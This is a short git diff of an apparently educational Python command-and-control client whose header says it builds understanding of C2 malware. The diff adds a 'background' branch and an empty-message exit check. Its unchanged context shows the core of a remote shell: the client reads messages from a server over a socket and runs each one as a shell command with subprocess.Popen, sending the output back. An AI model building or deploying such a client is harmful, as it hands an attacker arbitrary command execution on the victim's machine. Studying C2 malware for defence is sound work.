@@ -8,8 +8,8 @@
 #                   understanding of C2 malware and a further understanding of Python 
 #                   Socket applications.
 # Theme Song:   https://www.youtube.com/watch?v=3abZal0fXCU&ab_channel=MichaelWyckoff
-# Changelog:    Moved some exception handling into __main__
-#               Revised exception handling
+# Changelog:    Implemented 'background' function
+#               Fixed infinite loop bug upon serverside keyboard interrupt
 ###########################################################################################
 
 import socket
@@ -51,7 +51,7 @@ def handler():
         message = comm_in()
         print('[+] Message from server: ' + message)
 
-        if message == 'exit':
+        if message == 'exit' or message == '':
             print('[-] The server has terminated the session.')
             sock.close()
             break
@@ -66,7 +66,8 @@ def handler():
             except FileNotFoundError:
                 comm_out('Invalid directory. Please try again.')
                 continue
-
+        elif message == 'background':
+            pass
         else:
             command = subprocess.Popen(message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
             output = command.stdout.read() + command.stderr.read()
